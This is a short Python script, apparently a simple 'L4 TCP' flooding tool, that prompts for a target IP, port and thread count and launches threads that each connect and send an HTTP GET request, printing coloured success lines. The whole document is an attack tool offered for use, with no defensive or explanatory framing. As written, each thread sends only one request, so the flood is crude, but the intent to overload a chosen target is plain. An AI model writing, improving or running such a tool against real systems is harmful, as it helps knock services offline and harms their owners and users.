import threading
import socket

ip = socket.gethostbyname(input("IP: "))
port = int(input("Port: "))
threads = int(input("Threads: "))


def l4_tcp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))

        s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())

        print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {ip}:{port}")

    except Exception as err:
        print("\033[31m[-]\033[0m", err)


for i in range(threads):
    t = threading.Thread(target=l4_tcp)
    t.start()

input("")
